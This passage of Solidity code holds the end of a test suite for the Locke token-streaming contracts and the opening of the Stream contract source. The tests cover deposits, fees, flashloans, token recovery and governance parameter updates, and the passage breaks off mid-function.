sig,\n            abi.encode(address(testTokenA), 0),\n            \"inc\"\n        );\n\n        uint256 bal = testTokenC.balanceOf(address(this));\n        testTokenC.approve(address(stream), type(uint256).max);\n        stream.createIncentive(address(testTokenC), 100);\n        assertEq(stream.incentives(address(testTokenC)), 100);\n\n        hevm.warp(startTime + minStreamDuration);\n        stream.claimIncentive(address(testTokenC));\n        assertEq(testTokenC.balanceOf(address(this)), bal);\n    }\n\n\n    function test_claimDeposit() public {\n        (\n            uint32 maxDepositLockDuration,\n            uint32 maxRewardLockDuration,\n            uint32 maxStreamDuration,\n            uint32 minStreamDuration\n        ) = defaultStreamFactory.streamParams();\n\n        uint32 startTime = uint32(block.timestamp + 10);\n\n        uint32 endStream = startTime + minStreamDuration;\n        uint32 endDepositLock = endStream + maxDepositLockDuration;\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                true\n                // false,\n                // bytes32(0)\n            );\n\n            testTokenB.approve(address(stream), type(uint256).max);\n\n            stream.stake(100);\n            bytes4 sig = sigs(\"claimDepositTokens(uint112)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(100),\n                \"sale\"\n            );\n        }\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n                // false,\n                // bytes32(0)\n            );\n\n            testTokenB.approve(address(stream), type(uint256).max);\n\n            stream.stake(100);\n            bytes4 sig = sigs(\"claimDepositTokens(uint112)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(0),\n                \"amt\"\n            );\n        }\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n            );\n\n            testTokenB.approve(address(stream), type(uint256).max);\n\n            stream.stake(100);\n            bytes4 sig = sigs(\"claimDepositTokens(uint112)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(100),\n                \"lock\"\n            );\n        }\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n            );\n\n            testTokenB.approve(address(stream), type(uint256).max);\n\n            stream.stake(100);\n\n            hevm.warp(endDepositLock);\n            bytes4 sig = sigs(\"claimDepositTokens(uint112)\");\n            expect_revert(\n                address(stream),\n                sig,\n                abi.encode(101)\n            );\n            hevm.warp(startTime - 10);\n        }\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n            );\n\n            uint256 bal = testTokenB.balanceOf(address(this));\n            testTokenB.approve(address(stream), type(uint256).max);\n\n            stream.stake(100);\n\n            hevm.warp(endDepositLock + 1);\n            stream.claimDepositTokens(100);\n            assertEq(testTokenB.balanceOf(address(this)), bal);\n        }\n    }\n\n    function test_creatorClaimTokens() public {\n        (\n            uint32 maxDepositLockDuration,\n            uint32 maxRewardLockDuration,\n            uint32 maxStreamDuration,\n            uint32 minStreamDuration\n        ) = defaultStreamFactory.streamParams();\n\n        uint32 startTime = uint32(block.timestamp + 10);\n\n        uint32 endStream = startTime + minStreamDuration;\n        uint32 endDepositLock = endStream + maxDepositLockDuration;\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n                // false,\n                // bytes32(0)\n            );\n\n            testTokenB.approve(address(stream), type(uint256).max);\n\n            stream.stake(100);\n            bytes4 sig = sigs(\"creatorClaimSoldTokens(address)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(address(this)),\n                \"!sale\"\n            );\n        }\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                true\n                // false,\n                // bytes32(0)\n            );\n\n            testTokenB.approve(address(stream), type(uint256).max);\n\n            stream.stake(100);\n            hevm.warp(endStream);\n            stream.creatorClaimSoldTokens(address(this));\n            bytes4 sig = sigs(\"creatorClaimSoldTokens(address)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(address(this)),\n                \"claimed\"\n            );\n            hevm.warp(startTime - 10);\n        }\n\n        {\n            Stream stream = alice.doCreateStream(defaultStreamFactory, true);\n\n            testTokenB.approve(address(stream), type(uint256).max);\n\n            stream.stake(100);\n            bytes4 sig = sigs(\"creatorClaimSoldTokens(address)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(address(this)),\n                \"!creator\"\n            );\n        }\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                true\n                // false,\n                // bytes32(0)\n            );\n\n            testTokenB.approve(address(stream), type(uint256).max);\n\n            stream.stake(100);\n            bytes4 sig = sigs(\"creatorClaimSoldTokens(address)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(address(this)),\n                \"stream\"\n            );\n        }\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                true\n                // false,\n                // bytes32(0)\n            );\n\n            uint256 bal = testTokenB.balanceOf(address(this));\n            testTokenB.approve(address(stream), type(uint256).max);\n\n            stream.stake(100);\n            hevm.warp(endStream);\n            stream.creatorClaimSoldTokens(address(this));\n            assertEq(testTokenB.balanceOf(address(this)), bal);\n            hevm.warp(startTime - 10);\n        }\n    }\n\n    function test_claimFees() public {\n\n        (\n            uint32 maxDepositLockDuration,\n            uint32 maxRewardLockDuration,\n            uint32 maxStreamDuration,\n            uint32 minStreamDuration\n        ) = defaultStreamFactory.streamParams();\n\n        uint32 startTime = uint32(block.timestamp + 10);\n\n        uint32 endStream = startTime + minStreamDuration;\n        uint32 endDepositLock = endStream + maxDepositLockDuration;\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n            );\n\n            testTokenA.approve(address(stream), type(uint256).max);\n            stream.fundStream(1000);\n\n            bob.failClaimFees(stream);\n        }\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n            );\n\n            testTokenA.approve(address(stream), type(uint256).max);\n            stream.fundStream(1000);\n            \n            bytes4 sig = sigs(\"claimFees(address)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(address(this)),\n                \"stream\"\n            );\n        }\n\n        {\n            defaultStreamFactory.updateFeeParams(StreamFactory.GovernableFeeParams({\n                feePercent: 100,\n                feeEnabled: true\n            }));\n\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n            );\n\n            uint256 bal = testTokenA.balanceOf(address(this));\n            testTokenA.approve(address(stream), type(uint256).max);\n            stream.fundStream(1000);\n            \n            uint256 feeAmt = 1000*100/10000;\n            hevm.warp(endStream);\n            stream.claimFees(address(this));\n            assertEq(testTokenA.balanceOf(address(this)), bal - 1000 + feeAmt);\n        }\n    }\n\n    function test_flashloan() public {\n        (\n            uint32 maxDepositLockDuration,\n            uint32 maxRewardLockDuration,\n            uint32 maxStreamDuration,\n            uint32 minStreamDuration\n        ) = defaultStreamFactory.streamParams();\n\n        uint32 startTime = uint32(block.timestamp + 10);\n\n        uint32 endStream = startTime + minStreamDuration;\n        uint32 endDepositLock = endStream + maxDepositLockDuration;\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n            );\n\n            testTokenA.approve(address(stream), type(uint256).max);\n            stream.fundStream(1000000);\n            bob.doStake(stream, address(testTokenB), 1000000);\n\n            bytes4 sig = sigs(\"flashloan(address,address,uint112,bytes)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(address(testTokenC), address(this), 0, \"\"),\n                \"erc\"\n            );\n            \n\n            stream.flashloan(address(testTokenA), address(this), 1000000, abi.encode(true, testTokenA.balanceOf(address(this))));\n            (,,uint112 rewardFee,) = stream.tokenAmounts();\n            assertEq(rewardFee, 1000000 * 10 / 10000);\n            assertTrue(enteredFlashloan);\n            enteredFlashloan = false;\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(address(testTokenA), address(this), 1000000, abi.encode(false, testTokenA.balanceOf(address(this)))),\n                \"f4\"\n            );\n\n            stream.flashloan(address(testTokenB), address(this), 1000000, abi.encode(true, testTokenB.balanceOf(address(this))));\n            (,,,uint112 depositFlFees) = stream.tokenAmounts();\n            assertEq(depositFlFees, 1000000 * 10 / 10000);\n            assertTrue(enteredFlashloan);\n            enteredFlashloan = false;\n\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(address(testTokenB), address(this), 1000000, abi.encode(false, testTokenB.balanceOf(address(this)))),\n                \"f1\"\n            );\n\n            uint256 balA = testTokenA.balanceOf(address(this));\n            uint256 balB = testTokenB.balanceOf(address(this));\n            hevm.warp(endStream);\n            stream.claimFees(address(this));\n            assertEq(testTokenA.balanceOf(address(this)), balA + 1000000 * 10 / 10000);\n            assertEq(testTokenB.balanceOf(address(this)), balB + 1000000 * 10 / 10000);\n        }\n    }\n\n\n    function test_recoverTokens() public {\n        (\n            uint32 maxDepositLockDuration,\n            uint32 maxRewardLockDuration,\n            uint32 maxStreamDuration,\n            uint32 minStreamDuration\n        ) = defaultStreamFactory.streamParams();\n\n        uint32 startTime = uint32(block.timestamp + 10);\n\n        uint32 endStream = startTime + minStreamDuration;\n        uint32 endDepositLock = endStream + maxDepositLockDuration;\n        uint32 endRewardLock = endStream + 0;\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n            );\n\n            testTokenA.approve(address(stream), type(uint256).max);\n            stream.fundStream(1000000);\n            bob.doStake(stream, address(testTokenB), 1000000);\n\n            bytes4 sig = sigs(\"recoverTokens(address,address)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(address(testTokenB), address(this)),\n                \"time\"\n            );\n            uint256 bal = testTokenB.balanceOf(address(this));\n            testTokenB.transfer(address(stream), 100);\n            hevm.warp(endDepositLock + 1);\n            stream.recoverTokens(address(testTokenB), address(this));\n            assertEq(testTokenB.balanceOf(address(this)), bal);\n            hevm.warp(startTime - 10);\n        }\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n            );\n\n            testTokenA.approve(address(stream), type(uint256).max);\n            stream.fundStream(1000000);\n            bob.doStake(stream, address(testTokenB), 1000000);\n\n            bytes4 sig = sigs(\"recoverTokens(address,address)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(address(testTokenA), address(this)),\n                \"time\"\n            );\n            uint256 bal = testTokenA.balanceOf(address(this));\n            testTokenA.transfer(address(stream), 100);\n            hevm.warp(endRewardLock + 1);\n            stream.recoverTokens(address(testTokenA), address(this));\n            assertEq(testTokenA.balanceOf(address(this)), bal);\n            hevm.warp(startTime - 10);\n        }\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n            );\n\n            testTokenA.approve(address(stream), type(uint256).max);\n            stream.fundStream(1000000);\n            bob.doStake(stream, address(testTokenB), 1000000);\n\n\n            testTokenC.approve(address(stream), type(uint256).max);\n            stream.createIncentive(address(testTokenC), 100);\n\n            bytes4 sig = sigs(\"recoverTokens(address,address)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(address(testTokenC), address(this)),\n                \"stream\"\n            );\n            uint256 bal = testTokenC.balanceOf(address(this));\n            testTokenC.transfer(address(stream), 100);\n            hevm.warp(endStream + 1);\n            stream.recoverTokens(address(testTokenC), address(this));\n            uint256 newbal = testTokenC.balanceOf(address(this));\n            assertEq(newbal, bal);\n            stream.claimIncentive(address(testTokenC));\n            assertEq(testTokenC.balanceOf(address(this)), newbal + 100);\n            hevm.warp(startTime - 10);\n        }\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n            );\n\n            testTokenA.approve(address(stream), type(uint256).max);\n            stream.fundStream(1000000);\n            bob.doStake(stream, address(testTokenB), 1000000);\n\n            uint256 bal = testTokenC.balanceOf(address(this));\n            testTokenC.transfer(address(stream), 100);\n            hevm.warp(endStream);\n            stream.recoverTokens(address(testTokenC), address(this));\n            assertEq(testTokenC.balanceOf(address(this)), bal);\n            hevm.warp(startTime - 10);\n        }\n    }\n\n    function test_arbitraryCall() public {\n        (\n            uint32 maxDepositLockDuration,\n            uint32 maxRewardLockDuration,\n            uint32 maxStreamDuration,\n            uint32 minStreamDuration\n        ) = defaultStreamFactory.streamParams();\n\n        uint32 startTime = uint32(block.timestamp + 10);\n\n        uint32 endStream = startTime + minStreamDuration;\n        uint32 endDepositLock = endStream + maxDepositLockDuration;\n        uint32 endRewardLock = endStream + 0;\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n            );\n\n            testTokenA.approve(address(stream), type(uint256).max);\n            stream.fundStream(1000000);\n            bob.doStake(stream, address(testTokenB), 1000000);\n\n            testTokenC.approve(address(stream), type(uint256).max);\n            stream.createIncentive(address(testTokenC), 100);\n\n            bytes4 sig = sigs(\"arbitraryCall(address,bytes)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(address(testTokenC), \"\"),\n                \"inc\"\n            );\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(address(testTokenA), \"\"),\n                \"erc\"\n            );\n        }\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n            );\n\n            uint256 bal = testTokenC.balanceOf(address(this));\n            testTokenA.approve(address(stream), type(uint256).max);\n            stream.fundStream(1000000);\n            bob.doStake(stream, address(testTokenB), 1000000);\n\n            testTokenC.transfer(address(stream), 100);\n\n            bytes memory data = abi.encodePacked(sigs(\"transfer(address,uint256)\"), abi.encode(address(this), 100));\n            stream.arbitraryCall(address(testTokenC), data);\n            assertEq(testTokenC.balanceOf(address(this)), bal);\n        }\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n            );\n\n            uint256 bal = testTokenC.balanceOf(address(this));\n            testTokenA.approve(address(stream), type(uint256).max);\n            stream.fundStream(1000000);\n            bob.doStake(stream, address(testTokenB), 1000000);\n\n            testTokenC.transfer(address(stream), 100);\n\n            bytes memory data = abi.encodePacked(sigs(\"transfer(address,uint256)\"), abi.encode(address(this), 100));\n            stream.arbitraryCall(address(testTokenC), data);\n            assertEq(testTokenC.balanceOf(address(this)), bal);\n        }\n\n        {\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n            );\n\n            uint256 bal = testTokenC.balanceOf(address(this));\n            testTokenA.approve(address(stream), type(uint256).max);\n            stream.fundStream(1000000);\n            bob.doStake(stream, address(testTokenB), 1000000);\n\n            bytes memory data = abi.encodePacked(sigs(\"manualBurn(address,address)\"), abi.encode(address(testTokenA), address(stream)));\n            bytes4 sig = sigs(\"arbitraryCall(address,bytes)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(address(this), data),\n                \"erc\"\n            );\n        }\n    }\n\n    function manualBurn(address token, address who) public {\n        uint256 curBal = ERC20(token).balanceOf(who);\n        write_balanceOf_ts(token, who, curBal - 10);\n    }\n\n    function lockeCall(address originator, address token, uint256 amount, bytes memory data) public {\n        Stream stream = Stream(msg.sender);\n        (bool sendBackFee, uint112 prevBal) = abi.decode(data, (bool, uint112));\n        assertEq(ERC20(token).balanceOf(address(this)), prevBal + amount);\n        if (sendBackFee) {\n            ERC20(token).transfer(msg.sender, amount * 10 / 10000);\n        }\n        ERC20(token).transfer(msg.sender, amount);\n        enteredFlashloan = true;\n        return;\n    }\n}\n\n\n\ncontract StreamFactoryTest is LockeTest {\n    function test_createStream() public {\n\n        // ===  EXPECTED FAILURES ===\n        (\n            uint32 maxDepositLockDuration,\n            uint32 maxRewardLockDuration,\n            uint32 maxStreamDuration,\n            uint32 minStreamDuration\n        ) = defaultStreamFactory.streamParams();\n\n        {\n            // Fails\n            bytes4 sig = sigs(\"createStream(address,address,uint32,uint32,uint32,uint32,bool)\");\n            expect_revert_with(\n                address(defaultStreamFactory),\n                sig,\n                abi.encode(\n                    address(0),\n                    address(0),\n                    block.timestamp - 10,\n                    0,\n                    0,\n                    0,\n                    false\n                    // false,\n                    // bytes32(0)\n                ),\n                \"past\"\n            );\n\n            if (minStreamDuration > 0) {\n                expect_revert_with(\n                    address(defaultStreamFactory),\n                    sig,\n                    abi.encode(\n                        address(0),\n                        address(0),\n                        block.timestamp,\n                        minStreamDuration - 1,\n                        0,\n                        0,\n                        false\n                        // false,\n                        // bytes32(0)\n                    ),\n                    \"stream\"\n                );\n            }\n\n            expect_revert_with(\n                address(defaultStreamFactory),\n                sig,\n                abi.encode(\n                    address(0),\n                    address(0),\n                    block.timestamp,\n                    maxStreamDuration + 1,\n                    0,\n                    0,\n                    false\n                    // false,\n                    // bytes32(0)\n                ),\n                \"stream\"\n            );\n\n            expect_revert_with(\n                address(defaultStreamFactory),\n                sig,\n                abi.encode(\n                    address(0),\n                    address(0),\n                    block.timestamp,\n                    minStreamDuration,\n                    maxDepositLockDuration + 1,\n                    0,\n                    false\n                    // false,\n                    // bytes32(0)\n                ),\n                \"lock\"\n            );\n\n            expect_revert_with(\n                address(defaultStreamFactory),\n                sig,\n                abi.encode(\n                    address(0),\n                    address(0),\n                    block.timestamp,\n                    minStreamDuration,\n                    maxDepositLockDuration,\n                    maxRewardLockDuration + 1,\n                    false\n                    // false,\n                    // bytes32(0)\n                ),\n                \"reward\"\n            );\n        }\n        // ===   ===\n        \n\n        // === Successful ===\n        {\n            // No Fees\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                uint32(block.timestamp + 10), // 10 seconds in future\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n                // false,\n                // bytes32(0)\n            );\n\n            (uint16 feePercent, bool feeEnabled) = defaultStreamFactory.feeParams();\n\n            // time stuff\n            (uint32 startTime, uint32 streamDuration, uint32 depositLockDuration, uint32 rewardLockDuration) = stream.streamParams();\n            assertEq(startTime, block.timestamp + 10);\n            assertEq(streamDuration, minStreamDuration);\n            assertEq(depositLockDuration, maxDepositLockDuration);\n            assertEq(rewardLockDuration, 0);\n\n            // tokens\n            assertEq(stream.rewardToken(), address(testTokenA));\n            assertEq(stream.depositToken(), address(testTokenB));\n\n            // address\n            // assertEq(address(uint160(uint(hash))), address(stream));\n\n            // id\n            assertEq(stream.streamId(), 0);\n\n            // factory\n            assertEq(defaultStreamFactory.currStreamId(), 1);\n\n            // token\n            assertEq(stream.name(), \"lockeTest Token B: 0\");\n            assertEq(stream.symbol(), \"lockeTTB0\");\n\n            // others\n            (feePercent, feeEnabled) = stream.feeParams();\n            assertEq(feePercent, 0);\n            assertTrue(!feeEnabled);\n            assertTrue(!stream.isSale());\n        }\n        \n        {\n            // With Fees\n            defaultStreamFactory.updateFeeParams(StreamFactory.GovernableFeeParams({\n                feePercent: 100,\n                feeEnabled: true\n            }));\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                uint32(block.timestamp + 10), // 10 seconds in future\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n                // false,\n                // bytes32(0)\n            );\n\n            (uint16 feePercent, bool feeEnabled) = defaultStreamFactory.feeParams();\n\n            // time stuff\n            (uint32 startTime, uint32 streamDuration, uint32 depositLockDuration, uint32 rewardLockDuration) = stream.streamParams();\n            assertEq(startTime, block.timestamp + 10);\n            assertEq(streamDuration, minStreamDuration);\n            assertEq(depositLockDuration, maxDepositLockDuration);\n            assertEq(rewardLockDuration, 0);\n\n            // tokens\n            assertEq(stream.rewardToken(), address(testTokenA));\n            assertEq(stream.depositToken(), address(testTokenB));\n\n            // address\n            // assertEq(address(uint160(uint(hash))), address(stream));\n\n            // id\n            assertEq(stream.streamId(), 1);\n\n            // factory\n            assertEq(defaultStreamFactory.currStreamId(), 2);\n\n            // token\n            assertEq(stream.name(), \"lockeTest Token B: 1\");\n            assertEq(stream.symbol(), \"lockeTTB1\");\n\n            // other\n            (feePercent, feeEnabled) = stream.feeParams();\n            assertEq(feePercent, 100);\n            assertTrue(feeEnabled);\n            assertTrue(!stream.isSale());\n        }\n        // ===   ===\n    }\n\n\n    function test_updateStreamParams() public {\n        // set the gov to none\n        write_flat(address(defaultStreamFactory), \"gov()\", address(0));\n        StreamFactory.GovernableStreamParams memory newParams = StreamFactory.GovernableStreamParams({\n            maxDepositLockDuration: 1337 weeks,\n            maxRewardLockDuration: 1337 weeks,\n            maxStreamDuration: 1337 weeks,\n            minStreamDuration: 1337 hours\n        });\n        expect_revert_with(\n            address(defaultStreamFactory),\n            sigs(\"updateStreamParams((uint32,uint32,uint32,uint32))\"),\n            abi.encode(newParams),\n            \"!gov\"\n        );\n\n        // get back gov and set and check\n        write_flat(address(defaultStreamFactory), \"gov()\", address(this));\n        defaultStreamFactory.updateStreamParams(newParams);\n\n        (\n            uint32 maxDepositLockDuration,\n            uint32 maxRewardLockDuration,\n            uint32 maxStreamDuration,\n            uint32 minStreamDuration\n        ) = defaultStreamFactory.streamParams();\n        assertEq(maxDepositLockDuration, 1337 weeks);\n        assertEq(maxRewardLockDuration, 1337 weeks);\n        assertEq(maxStreamDuration, 1337 weeks);\n        assertEq(minStreamDuration, 1337 hours);\n    }\n\n    function test_updateFeeParams() public {\n        // set the gov to none\n        write_flat(address(defaultStreamFactory), \"gov()\", address(0));\n        \n        uint16 max = 500;\n        StreamFactory.GovernableFeeParams memory newParams = StreamFactory.GovernableFeeParams({\n            feePercent: max + 1,\n            feeEnabled: true\n        });\n        expect_revert_with(\n            address(defaultStreamFactory),\n            sigs(\"updateFeeParams((uint16,bool))\"),\n            abi.encode(newParams),\n            \"!gov\"\n        );\n\n        // get back gov and set and check\n        write_flat(address(defaultStreamFactory), \"gov()\", address(this));\n        \n        expect_revert_with(\n            address(defaultStreamFactory),\n            sigs(\"updateFeeParams((uint16,bool))\"),\n            abi.encode(newParams),\n            \"fee\"\n        );\n\n        newParams.feePercent = 137;\n\n        defaultStreamFactory.updateFeeParams(newParams);\n        (\n            uint16 feePercent,\n            bool feeEnabled\n        ) = defaultStreamFactory.feeParams();\n        assertEq(feePercent, 137);\n        assertTrue(feeEnabled);\n    }\n}\n\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.0;\n\nimport \"./LockeERC20.sol\";\nimport \"solmate/utils/SafeTransferLib.sol\";\nimport \"solmate/tokens/ERC20.sol\";\n\n// ====== Governance =====\ncontract Governed {\n    address public gov;\n    address private pendingGov;\n    address public emergency_gov;\n\n    event NewGov(address indexed oldGov, address indexed newGov);\n    event NewPendingGov(address indexed oldPendingGov, address indexed newPendingGov);\n\n    constructor(address _governor, address _emergency_governor) public {\n        gov = _governor;\n        emergency_gov = _emergency_governor;\n    }\n\n    function governorship() public view returns (address, address, address) {\n        return (gov, emergency_gov, pendingGov);\n    }\n\n    /// Update pending governor\n    function setPendingGov(address newPendingGov) governed public {\n        address old = pendingGov;\n        pendingGov = newPendingGov;\n        emit NewPendingGov(old, newPendingGov);\n    }\n\n    /// Accepts governorship\n    function acceptGov() public {\n        require(pendingGov == msg.sender, \"!pending\");\n        address old = gov;\n        gov = pendingGov;\n        emit NewGov(old, pendingGov);\n    }\n\n    function setEmergencyGov(address who) public governed {\n        emergency_gov = who;\n    } \n\n    /// Remove governor\n    function __abdicate() governed public {\n        address old = gov;\n        gov = address(0);\n        emit NewGov(old, address(0));\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier governed {\n        require(msg.sender == gov, \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier emergency_governed {\n        require(msg.sender == gov || msg.sender == emergency_gov, \"!egov\");\n        _;\n    }\n}\n\ninterface IGoverned {\n    function gov() external view returns (address);\n    function emergency_gov() external view returns (address);\n}\n\nabstract contract ExternallyGoverned {\n    IGoverned public gov;\n\n    constructor(address governor) {\n        gov = IGoverned(governor);\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier externallyGoverned {\n        require(msg.sender == gov.gov(), \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier externallyEmergencyGoverned {\n        require(msg.sender == gov.gov() || msg.sender == gov.emergency_gov(), \"!e_gov\");\n        _;\n    }\n}\n\ninterface LockeCallee {\n    function lockeCall(address initiator, address token, uint256 amount, bytes calldata data) external;\n}\n\n// ====== Stream =====\ncontract Stream is LockeERC20, ExternallyGoverned {\n    using SafeTransferLib for ERC20;    \n    // ======= Structs ========\n    struct TokenStream {\n        uint256 lastCumulativeRewardPerToken;\n        uint256 virtualBalance;\n        uint112 rewards;\n        uint112 tokens;\n        uint32 lastUpdate;\n        bool merkleAccess;\n    }\n\n    // ======= Storage ========\n    // ==== Immutables =====\n    // stream start time\n    uint32 private immutable startTime;\n    // length of stream\n    uint32 private immutable streamDuration;\n    // length of time depositTokens are locked after stream ends\n    uint32 private immutable depositLockDuration;\n    // length of time rewardTokens are locked after stream ends\n    uint32 private immutable rewardLockDuration;\n\n    // end of stream\n    uint32 private immutable endStream;\n    // end of deposit lock\n    uint32 private immutable endDepositLock;\n    // end of reward lock\n    uint32 private immutable endRewardLock;\n\n    // Token given to depositer\n    address public immutable rewardToken;\n    // Token deposited\n    address public immutable depositToken;\n\n    // This stream's id\n    uint64 public immutable streamId;\n\n    // fee percent on reward tokens\n    uint16 private immutable feePercent;\n    // are fees enabled\n    bool private immutable feeEnabled;\n\n    // deposits are basically a *sale* to the stream creator if true\n    bool public immutable isSale;\n\n    // stream creator\n    address public immutable streamCreator;\n\n    uint112 private immutable depositDecimalsOne;\n    // ============\n\n    //  == sloc a ==\n    // internal reward token amount to be given to depositors\n    uint112 private rewardTokenAmount;\n    // internal deposit token amount locked/to be sold to stream creator\n    uint112 private depositTokenAmount;\n    // ============\n\n    // == slot b ==\n    uint112 private rewardTokenFeeAmount;\n    uint112 private depositTokenFlashloanFeeAmount;\n    uint8 private unlocked = 1;\n    bool private claimedDepositTokens;\n    // ============\n\n    // == slot c ==\n    uint256 private cumulativeRewardPerToken;\n    // ============\n\n    // == slot d ==\n    uint256 private totalVirtualBalance;\n    // ============\n\n    // == slot e ==\n    uint112 public unstreamed;\n    uint112 private redeemedDepositTokens;\n    uint32 private lastUpdate;\n    // ============\n\n    // mapping of address to number of tokens not yet streamed over\n    mapping (address => TokenStream) public tokensNotYetStreamed;\n\n    // external incentives to stream creator\n    mapping (address => uint112) public incentives;\n\n    // ======= Events ========\n    event StreamFunded(uint256 amount);\n    event Staked(address indexed who, uint256 amount);\n    event Withdrawn(address indexed who, uint256 amount);\n    event StreamIncentivized(address indexed token, uint256 amount);\n    event StreamIncentiveClaimed(address indexed token, uint256 amount);\n    event SoldTokensClaimed(address indexed who, uint256 amount);\n    event DepositTokensReclaimed(address indexed who, uint256 amount);\n    event FeesClaimed(address indexed token, address indexed who, uint256 amount);\n    event RecoveredTokens(address indexed token, address indexed recipient, uint256 amount);\n    event RewardsClaimed(address indexed who, uint256 amount);\n    event Flashloaned(address indexed token, address indexed who, uint256 amount, uint256 fee);\n\n    // ======= Modifiers ========\n    modifier updateStream(address who) {\n        // save bytecode space by making it a jump instead of inlining at cost of gas\n        updateStreamInternal(who);\n        _;\n    }\n\n    function updateStreamInternal(address who) internal {\n        require(block.timestamp < endStream , \"!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        if (block.timestamp >= startTime) {\n            // set lastUpdates if need be\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = uint32(block.timestamp);\n            }\n\n            // accumulate reward per token info\n            cumulativeRewardPerToken = rewardPerToken();\n\n            // update user rewards\n            ts.rewards = earned(ts, cumulativeRewardPerToken);\n            // update users last cumulative reward per token\n            ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n            // update users unstreamed balance\n            uint32 acctTimeDelta = uint32(block.timestamp) - ts.lastUpdate;\n            if (acctTimeDelta > 0 && ts.tokens > 0) {\n                